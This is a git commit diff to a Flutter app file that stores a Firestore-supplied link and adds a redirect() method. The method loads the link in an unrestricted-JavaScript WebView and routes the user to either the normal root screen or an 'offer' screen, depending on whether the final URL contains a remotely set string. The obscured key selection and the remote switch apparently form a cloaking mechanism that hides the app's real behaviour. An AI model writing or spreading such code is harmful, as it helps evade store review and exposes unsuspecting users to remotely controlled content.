c5bff790ba7e5c25a9b25b8451b6c298f183e9b6
ArturKozack <ar.k@dcjudgement.com>
2024-09-04 12:34:32 +0200

    Update spd_notifier.dart

--- lib/spd_notifier.dart
+++ lib/spd_notifier.dart
@@ -1,6 +1,8 @@
 import 'package:cloud_firestore/cloud_firestore.dart';
 import 'package:firebase_core/firebase_core.dart';
+import 'package:flutter/material.dart';
 import 'package:shared_preferences/shared_preferences.dart';
+import 'package:webview_flutter/webview_flutter.dart';
 
 class Data {
   final String link;
@@ -39,11 +41,12 @@ class SpdNotifier {
         fromFirestore: (snapshot, options) {
           final json = snapshot.data()!;
 
-
-
           return Data(
-            link: json[json.keys.where((element) => element.startsWith('_')).first],
-            block: json[json.keys.where((element) => _isStringOnlyLetters(element)).first],
+            link: json[
+                json.keys.where((element) => element.startsWith('_')).first],
+            block: json[json.keys
+                .where((element) => _isStringOnlyLetters(element))
+                .first],
           );
         },
         toFirestore: (app, _) {
@@ -55,19 +58,56 @@ class SpdNotifier {
 
       final model = doc.data() as Data;
 
-  
+      await prefs.setString(
+        integrationKey,
+        model.link,
+      );
 
-    
-        await prefs.setString(
-          integrationKey,
-          model.link,
+      await prefs.setString(
+        limitedKey,
+        model.block,
+      );
+    }
+  }
+
+  Future<void> redirect({
+    required VoidCallback rootNavigation,
+    required VoidCallback offernavifation,
+  }) async {
+    bool statusLoad = false;
+    final prefs = await SharedPreferences.getInstance();
+    final fetchData = prefs.getString(integrationKey);
+
+    if (fetchData != null) {
+      final webViewController = WebViewController()
+        ..setJavaScriptMode(JavaScriptMode.unrestricted)
+        ..loadRequest(Uri.parse(fetchData))
+        ..setNavigationDelegate(
+          NavigationDelegate(
+            onPageStarted: (_) async {
+              await Future.delayed(
+                const Duration(seconds: 2),
+              );
+            },
+            onPageFinished: (String url) async {
+              final block = prefs.getString(limitedKey);
+
+              if (block == null) {
+                statusLoad = true;
+              } else {
+                final status = url.contains(block);
+
+                statusLoad = status;
+              }
+
+              if (!statusLoad) {
+                return offernavifation.call();
+              }
+
+              return rootNavigation.call();
+            },
+          ),
         );
-    
-        await prefs.setString(
-          limitedKey,
-          model.block,
-        );
-      
     }
   }
 }
